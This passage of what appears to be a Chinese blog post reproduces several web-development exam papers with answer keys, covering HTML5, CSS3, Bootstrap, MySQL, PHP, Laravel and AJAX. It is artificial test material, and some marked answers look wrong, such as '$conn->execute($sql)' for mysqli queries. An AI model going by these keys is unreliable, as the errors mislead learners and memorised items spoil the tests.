会检查该文件是否已经被包含过，如果是则不会再次包含<br>D、require 在引入不存文件时产生一个警告且脚本还会继续执行，而 include 则会导致一个致命性错误且脚本停止执行</p><p>20、PHP 用于存储用户会话信息的超级全局变量是（）。 D<br>A、$_GET<br>B、$_POST<br>C、$_FILES<br>D、$_SESSION</p><p>21、在 PHP 中用于存储 cookie 数据的超级全局变量是（）。 D<br>A、$_COOKIES<br>B、$_GETCOOKIES<br>C、$_GETCOOKIE<br>D、$_COOKIE</p><p>22、以下 PHP 代码，用来查询 mysql 数据库中的 User 表，若能正常连接数据库，则以下选项中能正确执行 $sql 的查询语句的是（）。B</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584720305159.png" alt="第 22 题图"></p><p>A、mysqli_query($conn, $sql); </p><p>B、$conn-&gt;execute($sql);</p><p>C、$conn-&gt;query($sql); </p><p>D、query($sql);</p><p>23、使用 composer 下载 laravel 时，若不指定下载版本，默认下载哪个版本的 laravel（）。 A<br>A、最新版本<br>B、稳定版本<br>C、某一固定版本<br>D、无法下载</p><p>24、laravel 中控制器所在文件路径是（）。 A<br>A、app/Http/Controller<br>B、routes/Http/Controller<br>C、app/Controller<br>D、app/Http</p><p>25、laravel 的 Blade 模板中指定继承母模板的关键字是（）。 B<br>A、@section<br>B、@extends<br>C、@include<br>D、@yield</p><p>26、以下 laravel 代码中 $fillable 作用是（）。A</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584720314690.png" alt="第 26 题图"></p><p>A、设置允许写入的数据字段</p><p>B、设置不允许写入的数据字段</p><p>C、设置允许读取的数据字段</p><p>D、设置不允许读取的数据字段</p><p>27、下面选项中，创建 XMLHttpRequest 对象的语法正确的是（）。 A<br>A、xmlhttp=new XMLHttpRequest();<br>B、xmlhttp=new ActiveXObject(“Microsoft.XMLHTTP”);<br>C、xmlhttp=new XMLHttpRequest(“Microsoft.XMLHTTP”);<br>D、xmlhttp=new ActiveXObject();</p><p>28、使用 jQuery 发送 AJAX 请求，关于请求的类型说法正确的是 （）。 D<br>A、只能发送 GET 类型请求<br>B、只能发送 POST 类型请求<br>C、可以发送 PUT 类型请求<br>D、可以发送 GET 或者 POST 类型请求</p><p>29、浏览器客户端向服务器发送 AJAX 请求，服务器接收请求，处理完毕后，返回数据为 “处理成功”，AJAX 获取到服务器返回的数据时，以下关于 AJAX 响应属性正确的是（）。 B<br>A、status = 403<br>B、readyState = 4<br>C、status = 404<br>D、readyState = 3</p><p>30、下面选项中，将字符串 “”{“” 姓名 “”:”” 张三 “”,”” 性别 “”:”” 男 “”}”” 解析成 JSON 对象，写法正确的是（）。 C<br>A、JSON.parses (“”{“” 姓名 “”:”” 张三 “”,”” 性别 “”:”” 男 “”}””);<br>B、JSON.stringify (“”{“” 姓名 “”:”” 张三 “”,”” 性别 “”:”” 男 “”}””);<br>C、JSON.parse (“”{“” 姓名 “”:”” 张三 “”,”” 性别 “”:”” 男 “”}””);<br>D、JSON.string (“”{“” 姓名 “”:”” 张三 “”,”” 性别 “”:”” 男 “”}””);”</p><h2 id="二、多选题-每小题-2-分，共-30-分"><a href="#二、多选题-每小题-2-分，共-30-分" class="headerlink" title="二、多选题 (每小题 2 分，共 30 分)"></a>二、多选题 (每小题 2 分，共 30 分)</h2><p>1、在 Bootstrap 栅格系统中，适应移动端超小设备 (&lt;576px) 和移动端平板设备 (&lt;768px)，使用的类前缀是（）。 CD<br>A、.col-md-<br>B、.col-lg-<br>C、.col-<br>D、.col-sm-<br>2、下列关于 Bootstrap 栅格系统说法正确的是（）。 BCD<br>A、栅格系统每一行不能少于 12 列<br>B、通过 “行 (row)” 在水平方向创建一组 “列 (column)”<br>C、“行 (row)” 必须包含在.container（固定宽度）或.container-fluid (100% 宽度) 中，以便为其赋予合适的排列（aligment）和内补 (padding)<br>D、如果一 “行 (row)” 中包含了的 “列 (column)” 大于 12，多余的 “列 (column)” 所在的元素将被作为一个整体另起一行排列<br>3、在 HTML 5 中，用于播放视频与音频文件的元素是（）。 AB<br>A、<code>&lt;video&gt; 元素</code><br>B、<code>&lt;audio&gt; 元素</code><br>C、<code>&lt;music&gt; 元素</code><br>D、<code>&lt;move&gt; 元素</code><br>4、为了适应移动设备，html 页面可以用 meta 标签对 viewport 进行控制，meta 标签内可以控制下面哪些属性（）。 ABD<br>A、initial-scale<br>B、user-scalable<br>C、max-width<br>D、min-width<br>5、在 css3 单位中，哪些相对 font-size 属性来计算（）。 BD<br>A、vh<br>B、em<br>C、vw<br>D、rem<br>6、若用如下的 SQL 语句创建了一个 SC 表：<br>CREATE TABLE SC(S# CHAR (6) NOT NULL，C#CHAR (3) NOT NULL，SCORE INTEGER，NOTE CHAR(20))<br>向 SC 表插入如下数据时，哪些数据可以被成功插入（）。 AB<br>A、(‘201009’，’111’，60，’ 必修 ‘)<br>B、(‘200823’，’101’，NULL，NULL)<br>C、(NULL，’103’，80，’ 选修 ‘)<br>D、(‘201132’，NULL，86，’101’)<br>7、MySQL 数据库中，创建唯一索引的方式有（）。 AC<br>A、Create index<br>B、Create table<br>C、创建表时设置主键约束<br>D、创建表时设置唯一约束<br>8、XAMPP 套件中包括哪些内容（）。 ABC<br>A、PHP<br>B、Apache<br>C、MySQL<br>D、Chrome<br>9、PHP 支持的复合数据类型是（）。 BD<br>A、Boolean 布尔类型<br>B、Array 数组<br>C、Resource 资源类型<br>D、Object 对象<br>10、在 PHP 中，以下哪些是不等运算符（）。 BC<br>A、≠<br>B、!=<br>C、&lt;&gt;<br>D、&gt;&lt;<br>11、PHP 中可以实现循环的是（）。 AC<br>A、for<br>B、break<br>C、while<br>D、waiting<br>12、在 PHP 类定义中，对属性或方法的访问控制，是通过在前面添加关键字来实现的，以下属于访问控制关键字的选项是（）。 ABC<br>A、public<br>B、private<br>C、protected<br>D、default<br>13、以下 Laravel 路由配置代码，若相关的控制类以及方法，模板文件都存在，正确的是（）。 ABC<br>A、Route::post(“/login”, “UserController@login”);<br>B、Route::get(“/index”, function(){ return view(“index”);});<br>C、Route::match([“get”, “post”], “/reg”, “UserController@regist”);<br>D、Route::any([“get”, “post”], “/user/{id}”, function($id){ return “user ”.$id;});<br>14、使用 RESTful API 规范设计用户管理模块接口，设计新增用户接口和查询用户接口时，分别选用动词为（）。 BC<br>A、POST<br>B、PUT<br>C、GET<br>D、DELETE<br>15、在商品管理系统中，使用 jQuery ajax 发送请求，实现查询所有商品信息并显示至界面，最少需要在 jQuery ajax 中设置哪些属性（）。 ABD<br>A、url<br>B、type<br>C、data<br>D、succe</p><h2 id="三、判断题-每小题-2-分，共-10-分"><a href="#三、判断题-每小题-2-分，共-10-分" class="headerlink" title="三、判断题 (每小题 2 分，共 10 分)"></a>三、判断题 (每小题 2 分，共 10 分)</h2><p>1、Bootstrap 插件全部依赖 jQuery（ √）。<br>√ ×<br>2、某元素 hidden 属性为 true 时，元素属于不可见状态，元素内的内容也不会被浏览器创建（× ）。<br>√ ×<br>3、盒阴影 box-shadow 中 “阴影模糊值” 可以为负数（ ×）。<br>√ ×<br>4、MySQL 可使用 source 命令导入本地 sql 脚本文件（ √）。<br>√ ×<br>5、PHP 可以使用 “scanf” 来打印输出结果（× ）。<br>√ ×</p><h1 id="试题一"><a href="#试题一" class="headerlink" title="试题一"></a>试题一</h1><p>一、单选题（每小题 2 分，共 30 小题，共 60 分）<br>1、a 标签中哪一个属性是表示跳转路径的（B）<br>A．name B.href C.target D.class</p><p>2、 form 标签中哪个属性是文件上传必不可少的（D）<br>A．name B.action C.method D.enctype</p><p>3、 input 标签中，属性 type 的值是<strong>__</strong>, 表示文件上传（B）<br>A．text B.file C.password D.button</p><p>4、textarea&gt;&lt;/textarea  标签中表示文本可见宽度的属性是（B）<br>A．name B.cols C.rows D.disabled</p><p>5、table&gt;&lt;/table  标签中定义表格标题的标签是（A）<br>A．caption&gt; B.<th> C.<tr> D.<td></p><p>6、要将插入的图片大小设为宽 50 像素，高为 100 像素，则正确代码为（ A ）。<br>A、<code>&lt;img src=&quot;images/banner3.jpg&quot; width=&quot;50&quot; height=&quot;100&quot; /&gt;</code><br>B、<code>&lt;img src=&quot;images/banner3.jpg&quot; width=&quot;100&quot; height=&quot;50&quot; /&gt;</code><br>C、<code>&lt;img src=&quot;images/banner3.jpg&quot; width：50， height：100 /&gt;</code><br>D、<code>&lt;img src=&quot;images/banner3.jpg&quot; width：100， height：50 /&gt;</code></p><p>7、  下列 css 代码，(   C  ) 能控制鼠标悬浮其上的超链接样式。</p><p>A、 a:link{color:#ff7300;}<br>B、 a:visited{color:#ff7300;}<br>C、 a:hover{color:#ff7300;}<br>D、 a:active{color:#ff7300;}</p><p>8、CSS 3 中，提供了 transform-origin 属性实现什么（ A ）。<br>A．中心点变换 B．平移<br>C．旋转 D．倾斜</p><p>9、要实现在 X 轴倾斜 30 度，下面正确的是（ D ）。<br>A．skew(30deg,30deg) B．skewY(3deg)<br>C．skew(0,30deg) D．skewX(30deg)</p><p>10、想要查询数据库中总共有多少数据库，以及每个数据库的名称，需要用以下（ D ）语句？<br>A、show tables; B、show database; C、show datatables; D、show databases;</p><p>11、在创建存储过程中，需要设置一些存储过程的特性参数，其中 reads sql data 用来表示（ C ）<br>A、包含 sql 语句，但不包含读写语句<br>B、包含读语句<br>C、包含读写语句<br>D、包含写语句</p><p>12、MySQL 数据库中，数据类型 decimal (X,Y) 中的 X 和 Y 分别代表什么（ C ）？<br>A、X 代表小数点前的长度，Y 代表数据长度；<br>B、X 代表小数点后的长度，Y 代表数据长度；<br>C、X 代表数据长度，Y 代表小数点后的长度；<br>D、X 代表数据长度，Y 代表小数点前的长度；</p><p>13、在 student 表中的 dep 字段上添加名为 dep_idx 的全文索引，以下哪一个答案的字段及索引正确（ D ）<br>A、id int,stu_id int,index dep_idx(dep);<br>B、id int,stu_id int,fulltext index dep_idx(dep);<br>C、(id int,stu_id int,index dep_idx(dep))engine=myisam;<br>D、(id int,stu_id int,fulltext index dep_idx(dep))engine=myisam;</p><p>14、在 PHP 中，所有的变量以哪个符号开头？（ C ）<br>A 、! B 、&amp; C 、$ D 、?</p><p>15、php 遍历数组使用的是？（ B ）<br>A 、print B 、foreach C 、echo D 、print_r</p><p>16、语句 for ($k=0;$k=1;$k++); 和语句 for ($k=0;$k==1;$k++); 执行的次数分别是 ( A )<br>A 、无限和 0 B 、0 和无限 C 、都是无限 D 、都是 0</p><p>17、下列哪项不属于 OOP 的三大特性（ B ）。<br>A 、封装 B 、重载 C 、继承 D 、多态</p><p>18、对下拉菜单进行数据绑定时，将在 option 标记中增加哪个属性（ C ）<br>A 、name B 、value C 、selected D 、checked</p><p>19、在 PHP 中哪个变量数组总是包含所有总客户端发出的 cookies 数据 (A)。<br>A 、$_COOKIE B 、$_COOKIES C 、$_GETCOOKIE D 、$_GETCOOKIES</p><p>20、启动 session 的函数（ C ）<br>A 、startsession() B 、sessionstart() C 、session_start() D 、start()</p><p>21、如何在类的内容调用 mymethod 方法（ B ）<br>A 、$self-&gt;mymethod()<br>B 、$this-&gt;mymethod()<br>C 、$current-&gt;mymethod()<br>D 、$this::mymethod()</p><p>22、以下脚本输出什么（ D）<br>&lt;?php echo ‘Testing ’.1 + 2 . ‘45’? &gt;<br>A、Testing 1245 B、Testing 345 C、Testing 1+245 D、245</p><p>23、$a=’3’;$b=(integer)$a 属于什么类型转换？（ A ）<br>A、强制类型 B、自动类型 C、setType 类型 D、引用类型</p><p>24、以下代码执行结果？（ A ）</p><p><code>&lt;?php</code><br><code>mysql_connect(‘localhost’, ’root’, ‘’);</code><br><code>$result = mysql_query(“SELECT id, name FROM tb1”);</code><br><code>while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {</code><br><code>echo ’ID:’.$row[0].’Name:’.$row[];</code><br><code>}</code><br><code>?&gt;</code></p><p>A、报错 B、只打印第一条记录 C、循环换行打印全部记录 D、无任何结果</p><p>25、下面哪个写法能够设置用户端的 Cookie 的有效期是一个小时？（ A ）<br>A、 time() + 3600 B、 time(3600) C、 gmtime() + 3600 D、gmtime(3600)</p><ol start="26"><li>在 jquey 中，如果想要从 DOM 中删除所有匹配的元素，下面哪一个是正确的？（ C ）<br>A、delete() B、empty() C、remove() D、removeAll()</li></ol><p>27、以下不是 Ajax 的 XMLHttpRequest 对象属性的有（ B ）<br>A、onreadystatechange B、abort C、responseText D、status</p><p>28、 当 XMLHttpRequest 对象的状态发生改变时调用 callBackMethod 函数， 下列正确的是（ D ）。<br>A、xmlHttpRequest.callBackMethod=onreadystatechange;<br>B、xmlHttpRequest. onreadystatechange(callBackMethod);<br>C、xmlHttpRequest. onreadystatechange(new function(){callBackMethod });<br>D、xmlHttpRequest. onreadystatechange= callBackMethod;</p><p>29、AJAX 的核心是（ C）<br>A、基于标准的表示技术：XHTML/CSS<br>B、数据交换和操作技术：XML/XSLT<br>C、数据获取技术：XMLHttpRequest<br>D、客户端控制技术：JavaScript</p><p>30、 把所有 p 元素的背景色设置为红色的正确 jQuery 代码是？（ D ）<br>A、$(“p”).manipulate(“background-color”,”red”);<br>B、$(“p”).layout(“background-color”,”red”);<br>C、$(“p”).style(“background-color”,”red”);<br>D、$(“p”).css(“background-color”,”red”);</p><p>二、多选题（每小题 2 分，共 15 小题，共 30 分）<br>1、下列哪些属性是属于音频标签的（ABCD）<br>A．src B.autoplay C.loop D.controls</p><p>2、 input 标签中，属性 type 的值有多个，下列哪个是表示文本框和密码框的（AC）<br>A．text B.file C.password D.button<br>3、以下哪项属于 background-size 属性的参数值？（ ABC ）<br>A、auto; B、contain; C、cover; D、border;</p><p>4、以下哪项属于 linear-gradient 属性的参数值（ ABD ）<br>A、起点 B、渐变点 C、渐变线 D、角度；</p><p>5、下面选项中那些属于块级元素（ ACD ）<br>A、ul B、span C、div D、li;</p><p>6、数据表 user 表中有 id、name 和 age 三个字段，数据类型分别为 int (11)、varchar (20) 和 int (20)，现在想添加一个新的字段 email，数据类型为 varchar (30), 并将该字段添加为表中的最后一个字段，以下哪条语句正确（ CD ）？<br>A、alter table user add email varchar(30) last<br>B、alter table user add email varchar(30) after name<br>C、alter table user add email varchar(30) after age<br>D、alter table user add email varchar(30)</p><p>7、事务包含以下哪些特性（ ACD ）<br>A、一致性；B、同步性；C、原子性；D、持久性；</p><p>8、数据库系统（Database System）主要包括哪几个重要部分（ ABD ）<br>A、数据库管理系统（DBMS）;<br>B、数据库（DB）;<br>C、数据（Data）;<br>D、数据库应用程序；</p><p>9、下列选项中，哪些不是数组指针操作函数（ ABD ）<br>A 、current() B 、next() C 、count() D 、each()</p><p>10、PHP 类定义中支持的访问控制是（ ABC ）<br>A 、public B 、private C 、protected D 、friend</p><p>11、php 中可以实现程序分支结构的关键字是（ CD ）<br>A 、while B 、for C 、if D 、switch</p><p>12、下面哪项描述是错误的（ AC ）<br>A 、父类的构造函数与析构函数不会自动被调用<br>B 、成员变量需要用 public protected private 修饰，在定义变量时不再需要 var 关键字<br>C 、父类中定义的静态成员，不可以在子类中直接调用<br>D 、包含抽象方法的类必须为抽象类，抽象类不能被实例化</p><p>13、$result = preg_replace (“/\s<em>[quote][\n\r]</em>(.+?)[\n\r]<em>[/quote]\s</em>/is”, “\1”, $str); 该语句会匹配和替换出什么样的 $str？（ AD ）<br>A、[quote] [/quote] 不区分大小写<br>B、 [quote] [/quote] 区分大小写<br>C、 如果 $str = “[quote]\t\nabc\t\n [/quote]，则 $result = “tnabctn”;<br>D、如果 $str = “[quote]\t\nabc\t\n [/quote]，则 $result = ‘abc’;</p><p>14、 Ajax 的关键元素包括（ ABCD ）。<br>A、JavaScript<br>B、 DOM 文档对象<br>C、 CSS 样式表<br>D、XMLHttpRequest 对象</p><p>15、下面哪一个不是 jquery 对象访问的方法？（ ABC ）<br>A、each(callback) B、size() C、index(subject) D、index()</p><p>三、判断题（每小题 2 分，共 5 小题，共 10 分。在每小题后对应括号内填入判断结果，正确的选项填写 “√”，错误的选项填写 “×”）</p><p>1、CSS3 中的定位属性是 position。 （ 正确 ）</p><p>2、HTML5input 标签中，要在 form 提交时，强制验证，需要为其添加属性 required。正确</p><p>3、使用 CSS3 中的 box-sizing:border-box 属性后，width (宽) + padding (内边距) + border (边框) = 元素实际宽度。错误</p><p>4、在提交了 commit 事务之后，还可以对事务进行回滚操作（错误 ）。</p><p>5、用 PHP 进行服务器端的数据验证最好要在表单页面实现（ 正确 ）。</p><h1 id="试题二"><a href="#试题二" class="headerlink" title="试题二"></a>试题二</h1><p>一、单选题（每小题 2 分，共 30 小题，共 60 分）</p><p>1、HTML5 的正确 doctype 是？（）<br>A.<code>&lt;!DOCTYPE html&gt;</code><br>B.<code>&lt;!DOCTYPE HTML5&gt;</code><br>C.<code>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 5.0//EN&quot; &quot;http://www.w3.org/TR/html5/strict.dtd&quot;&gt;</code><br>D.<code>&lt;!DOCTYPE&gt;</code></p><p>2、在 HTML5 中，哪个元素用于组合标题元素？（）<br>A<code>.&lt;group&gt;</code><br>B.<code>&lt;header&gt;</code><br>C.<code>&lt;headings&gt;</code><br>D.<code>&lt;hgroup&gt;</code></p><p>3、在 HTML5 中，onblur 和 onfocus 是：（）<br>A.A.HTML 元素<br>B. 样式属性<br>C. 事件属性<br>D. 事件</p><p>4、用于播放 HTML5 视频文件的正确 HTML5 元素是：（）<br>A.<code>&lt;movie&gt;</code><br>B<code>.&lt;media&gt;</code><br>C.<code>&lt;video&gt;</code><br>D.<code>&lt;audio&gt;</code></p><p>5、用于播放 HTML5 音频文件的正确 HTML5 元素是：()<br>A<code>.&lt;mp3&gt;</code><br>B.<code>&lt;audio&gt;</code><br>C.<code>&lt;sound&gt;</code><br>D.<code>&lt;video&gt;</code></p><p>6、在 HTML5 中不再支持 <code>&lt;script&gt;</code> 元素的哪个属性？()<br>A.rel<br>B.href<br>C.type<br>D.src</p><p>7、在 HTML5 中，哪个方法用于获得用户的当前位置？()<br>A.getPosition()<br>B.getCurrentPosition()<br>C.getUserPosition()<br>D.Position()</p><p>8、CSS 3 中，提供的 transiton 属性实现了什么（ ）。<br>A．过渡 </p><p>B．平移<br>C．旋转</p><p>D．倾斜 </p><p>9、要实现 margin-top 的过渡效果，下面正确的是（ ）。<br>A．transition:margin-top 2s; B．transition-property:margin-top 2s;<br>C．transition-duration:margin-top 2s; D．transition-delay:margin-top 2s;</p><p>10、下列哪个选项是对字段设默认值的约束？（）<br>A. null<br>B. zerofill<br>C. unsigned<br>D. default</p><p>11、MySQL 的配置文件是（）<br>A.my.ini<br>B.httpd.conf<br>C.php.ini<br>D.config.inc.php</p><p>12、要想从 DOS 命令下进入 MySQL 控制台，首先必须做什么（）<br>A. 开启环境<br>B. 输入命令 MySQL -h localhost -u root -p<br>C. 设置环境变量<br>D. 设置 my.ini 配置文件</p><p>13、下列 SQL 语句，哪句是找出 user 表中 id 为 2，3，4 的用户并且根据 id 进行倒序排列（）<br>A. select * from user where id in (2,3,4) order by id desc;<br>B. select * from user where id in (2,3,4);<br>C. select * from user where id in (2,3,4) order by id asc;<br>D. select * from user where id in (2,4) order by id desc;</p><p>14、下面是函数的命名规范，选出有错误的选项（）<br>A. 函数名遵循 php 全名命名规则，字母数字下划线组成，不能以数字开头<br>B. 函数名区分大小写，通常必须使用小写<br>C. 不能重复声明函数名一样的函数<br>D. 检测函数名是否被声明 function_exists，小括号里面一定要加上引号</p><p>15、下面哪一个函数是 把字符串打散为数组（）<br>A. explode()<br>B. implode()<br>C. array_pop()<br>D. array_push()</p><p>16、下面选项中（ ）是 跳出本次循环，进入下次循环<br>A. die B. continue C. exit D. break</p><p>17、PHP 中，如何删除数组元素？( )<br>A. 数组变量 [下标]= 新值 B. unset (数组变量 [下标])<br>C. unset (数组变量) D. 数组变量 = array ();</p><p>18、对下面函数的调用，正确的是：（）</p><pre class=" language-html"><code class="language-html">function test(){    return 1;    echo '你好';}</code></pre><p>A. test(); B. return(); C. echo(); D. function();</p><p>19、下面代码执行的结果是（ ）<br>$str=”ab cde”;echo strlen($str);<br>A．6 B. 7 C. 8 D. 9</p><p>20、一个长度为 6 的字符串被 md5 函数加密后，返回一个字符串，该字符串的长度是（ ）<br>A：32 B：6 C：5 D：没有结果</p><p>21、下面代码执行的结果是（ ）<br>$str=”abcde”;echo $str{0}<br>A．e B. d C. u D. a</p><p>22、php 中函数 trim（）是什么意思？（）<br>A 删除字符串首尾处的空白字符（或者其他字符）;<br>B 删除字符串开头的空白字符（或其他字符）;<br>C 删除字符串末端的空白字符（或者其他字符）;<br>D 删除字符串中间的空白字符（或者其他字符）;</p><p>23、下面代码执行的结果是（ ）<br>$str=”abcde”; echo “hhh$str”;<br>A.abcde B. $str<br>C. hhh$str D. hhhabcde</p><p>24、下面代码执行的结果是（ ）。</p><pre class=" language-shell"><code class="language-shell">$bq="<p><b > 你好 </b></p>"; echo htmlentities ($bq);</code></pre><p>A. 加粗样式的你好<br>B. 你好<br>C. <code>&lt;p&gt; **你好** &lt;/p&gt;</code><br>D. <code>**你好**</code></p><p>25、.php 中查找字符串首次出现的位置，使用函数（ ）。<br>A、strpos（） B、stripos（）<br>C、strrpos() D、strripos()</p><p>26、php 中，函数 str_split（）的意思是（ ）<br>A、将字符串分割成小块<br>B、将字符串转换为数组<br>C、使用一个字符串分割另一个字符串，返回数组<br>D、截取字符串</p><p>27、php 中，函数 explode（）的意思是（ ）<br>A、将字符串分割成小块<br>B、将字符串转换为数组<br>C、使用一个字符串分割另一个字符串，返回数组<br>D、将一个一维数组的值转化为字符串，分割值可以不写默认空</p><p>28、php 中，函数 implode（）的意思是（ ）<br>A、将字符串分割成小块<br>B、将字符串转换为数组<br>C、使用一个字符串分割另一个字符串，返回数组<br>D、将一个一维数组的值转化为字符串，分割值可以不写默认空</p><p>29、下列哪一项是 Apache 的配置文件（ ）<br>A、php.ini ; B、httpd.conf ;<br>C、 my.ini; D、apache.exe;</p><p>30、Listen [::0]:80 （ ）<br>A、80 端口号 B、60 端口号<br>C、70 端口号 D、90 端口号窗体底端</p><p>二、多选题（每小题 2 分，共 15 小题，共 30 分）</p><p>1、写出下面单词在表单项中的作用，描述正确的是（）<br>A. autocomplete=”off” 关闭自动补全<br>B. autofocus 自动获取焦点<br>C. required 必填项<br>D. placeholder 输入框的提示信息</p><p>2、CSS 中，下列是 position 的值的是（）<br>A．static B.relative C.absolute D.fixed</p><p>3、以下哪项属于 transform 属性的值？（ ）<br>A、translate() B、rotate() C、scale() D、skew()</p><p>4、以下哪项属于盒子阴影属性的参数值（ ）<br>A、水平阴影 B、垂直阴影 C、模糊阴影 D、阴影颜色</p><p>5、HTML5 中下面哪项属于 input 的属性值（ ）<br>A、ul B、mail C、number D、range</p><p>6、以下对列的类型约束的说话正确的是？（）<br>A. unsigned 此列存储的是无符号的数<br>B. zerofill 不够的位数用 0 进行填充<br>C. auto_increment 字段值自增 ，此约束不能用在主键上<br>D. not null 不能插入空值</p><p>7、下列属于多表查询方式的是（ ）<br>A、join B、left join C、right join D、inner join</p><p>8、阻止默认行为的代码？（）<br>A. return false; B. e.preventDefault();<br>C. die() D. break()</p><p>9、 session 与 cookie 的数据存储位置（）<br>A. cookie 存储在浏览器端<br>B. session 存储在服务器端<br>C. cookie 存储在服务器端<br>D. session 存储在浏览器端</p><p>10、如何使用 cookie（）<br>A. setCookie (名称，值，生命周期，路径作用域)<br>B. echo $_COOKIE [‘ 名称 ‘];<br>C. session_start();<br>D. $_SESSION [‘ 名称 ‘] = 值；</p><p>11、如何使用 session （ ）<br>A. setCookie (名称，值，生命周期，路径作用域)<br>B. echo $_COOKIE [‘ 名称 ‘];<br>C. session_start();<br>D. $_SESSION [‘ 名称 ‘] = 值；</p><p>12、下面状态响应码分析代码的意思正确的是（）<br>A. 200 服务器响应成功<br>B. 404 服务器上没有改资源<br>C. 403 请求的服务器资源权限不够<br>D. 500 程序错误</p><p>13、关于 fopen () 打开文件，下面的说法正确的是（）</p><pre class=" language-html"><code class="language-html">A、w     只写方式.原文件内容截为0B、r     只写方式.C、a     追写方式.D、x     只写方式.文件存在则报错.</code></pre><p>14、下面有关目录的函数正确的是（ ）。<br>A、删除空目录 rmdir<br>B、删除文件 unlink<br>C、复制文件 copy<br>D、目录或文件是否存在 file_exists</p><p>15、下面关于文件上传表单部分，正确的是？（ ）<br>A、method 必须是 POST B、必须有 enctype=”multipart/form-data”<br>C、用 type=’file’ 的 input 标签让用户选择 D、method 必须是 GET</p><p>三、判断题（每小题 2 分，共 5 小题，共 10 分。在每小题后对应括号内填入判断结果，正确的选项填写 “√”，错误的选项填写 “×”）</p><p>1、以下是修改样式的几种方式，!important 的优先级最高（）.</p><pre class=" language-html"><code class="language-html"> 标签选择器  ID选择器  类选择器 style  !important      </code></pre><p>2、HTML5 input 标签中，type=“range” 定义的是滑块控件。（）</p><p>3、update 在数据库操作中是查询的意思。（）</p><p>4、PHP 中的变量名可以用数字开头（ ）。</p><p>5、PHP 中的数组都可以用 for 循环遍历（ ）。</p><p>答案：<br>1<del>5 ADCCB<br>6</del>10 CBAAD<br>11<del>15 ACABA<br>16</del>20 BBAAA<br>21<del>25 DACCA<br>26</del>30 BCDBA<br>多选：<br>1、ABCD 2、ABCD 3、ABCD 4、ABCD 5、BCD<br>6、ABD 7、BCD 8、AB 9、AB 10、AB<br>11、CD 12、ABCD 13、ABCD 14、ABCD 15、ABC</p><p>判断<br>1、正确 2、正确 3、错误 4、错误 5、错误</p><h1 id="试题三"><a href="#试题三" class="headerlink" title="试题三"></a>试题三</h1><p>一、单选题（每小题 2 分，共 30 小题，共 60 分）</p><p>1、PHP 变量格式说法错误的是（ ）</p><p>A、变量以 $ 开始 B、变量名称不区分大小写</p><p>C、变量名不能以数字开始 D、变量名中不能出现空格。</p><p>2、下列关于 PHP 语法正确的是（ ）</p><p>A、PHP 文件中可以包含 HTML 标签 B、PHP 语句以句号结束</p><p>C、<!-- --> 是 PHP 中的注释符号 D、PHP 脚本只能放在文档的开始位置</p><p>3、PHP 中关于包含文件上级目录中的”a.php” 的写法正确的是（ ）</p><p>A、import ../a.php; B、require ../a.php; C、require（“./a.php”）</p><p>D、require “../a.php” ;</p><p>4、关于 MySQL 说法正确的是（ ）</p><p>A、MySQL 是一种关系型数据库，以行列来存储数据</p><p>B、MySQL 只能用于小型项目</p><p>C、MySQL 自身具备可视化界面</p><p>D、MySQL 是收费的数据库</p><p>5、以下对 MySQL 数据库操作错误的是（ ）</p><p>A、show databases<strong>;</strong> <strong>B、use database_name**</strong>;**</p><p>C、<strong>drop database db_name;</strong> <strong>D、show table；</strong></p><p>6、MySQL 的浮点数据类型不包括（ ）</p><p>A、number B、float C、double D、decimal</p><p>7、模糊查询姓张的人的查询语句书写正确的是（ C ）</p><p>A、select * from table like ‘张 %’;</p><p>B、select * from table where name like ”_张”;</p><p>C、select * from table where name like ” 张 %”;</p><p>D、select * from table where name like ”% 张 %”</p><p>8、创建表的语句正确的是（ ）</p><p>A、create table mytable(id int(12),username varchar(20))；</p><p>B、createtable mytable(id int(12),username varchar(20))；</p><p>C、create table mytable(id(12),username(20) varchar));</p><p>D、create table mytable(id int(12);uername varchar(20));</p><p>9、不是 MySQL 约束的类型的是（ ）</p><p> A、not null B、 unique key C、primary key D、sort</p><p>10、下面查询语法错误的是（ ）</p><p> A、select * from table limit 10;</p><p>B、 select * from table limits 10,5;</p><p>C、 select * from table limit 10 offset 4;</p><p>D、select * from table limit 10,5;</p><p>11、数据库的基本操作中写法有错误的是（ ）</p><p> A、select * form table where x&gt;5;</p><p>B、insert into table (user,password) values(‘sys’,’123456’);</p><p>C、update table set user=’user1’;</p><p>D、delete from table user=’user1’ ;</p><p>12、以下关于 MySQL 函数解释错误的是（ ）</p><p>A、abs (x) : 返回 x 的绝对值</p><p>B、round (x,y) : 返回参数 x 的四舍五入的有 y 位小数的值</p><p>C、greatest (x1,x2,…,xn) : 返回集合中最大的值</p><p>D、<strong>trim (str) : 去除字符中的所有空格</strong></p><p>13、查看数据表结构的语句是（ ）</p><p>A、show tables; B、desc tablename;</p><p>C、show create tablename; D、show tablename;</p><p>14、下列数据类型中 PHP5 不支持的是（ ）</p><p>A、String B、 int C、Float D、Boolean</p><p>15、下列 PHP 函数写法正确的是（ ）</p><p>A、function void add(){ }</p><p>B、function add($x){return $x;}</p><p>C、function add(x){return x;}</p><p>D、function add($X){return $x; }</p><p>16、PHP 类中变量默认的访问权限是（ ）</p><p>A、public B、protected C、default D、private</p><p>17、PHP 类中只能内部所访问的权限是（ ）</p><p>A、public B、protected C、default D、private</p><p>18、关于 cookie 与 sessions 说法错误的是（ ）</p><p>A、cookie 是在服务器端创建，并写回到客户端浏览器</p><p>B、session 将信息保存到服务端</p><p>C、cookie 对文件的大小要求控制在 4K 以内</p><p>D、session 比 cookie 安全。</p><p>19、PHP 连接 MySQL 数据库步骤正确的是（ ）</p><p>①关闭数据库②连接 mysql③选择数据库名④执行 SQL 语句⑤关闭结果集</p><p>A、 ①②③④⑤ B、②③④⑤① C、③②④⑤① D、②③④①⑤</p><p>20、HTTP 协议中用于标识服务器内部错误的代码系列是（ ）</p><p>A、 5XX B、 2XX C、3XX D、4XX</p><p>21、以下哪个不是 bootstrap 的特点（ ）</p><p> A、移动设备优先 B、响应式设计</p><p>C、包含大量的内置组件，易于定制 D、闭源软件</p><p>22、bootstrap 的栅格系统描述错误的是（ ）</p><p>A、系统默认每行划分 12 列</p><p>B、网格可以嵌套</p><p>C、默认列间距是 30px</p><p>D、手机屏幕的列类前缀是.col-sm-x</p><p>23、以下关于列位移描述错误的是（ ）</p><p>A、col-push-x 列向右移动 x 个单位</p><p>B、col-pull-x 列向左移动 x 个单位</p><p>C、col-offset-x 块元素向右移动 x 